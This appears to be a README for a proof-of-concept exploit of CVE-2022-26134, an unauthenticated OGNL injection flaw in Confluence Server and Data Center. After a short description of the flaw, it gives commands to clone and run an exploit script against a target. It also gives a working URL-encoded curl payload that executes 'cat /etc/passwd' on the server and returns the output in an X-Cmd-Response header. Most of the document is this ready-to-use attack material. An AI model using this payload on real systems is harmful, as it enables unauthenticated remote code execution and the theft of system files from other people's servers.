### CVE-2022-26134 - OGNL injection vulnerability.

In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an unauthenticated attacker to execute arbitrary code on a Confluence Server or Data Center instance.


### PoC:

```bash
git clone https://github.com/kh4sh3i/CVE-2022-26134
cd CVE-2022-26134
python3 cve-2022-26134.py https://target.com CMD
```


Example with CURL command:
```bash
curl --head -k "https://YOUR_TARGET.com/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22cat%20%2Fetc%2Fpasswd%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D" 
```

Then, the result of the command will be reflected in the parameter `X-Cmd-Response` in the response header.
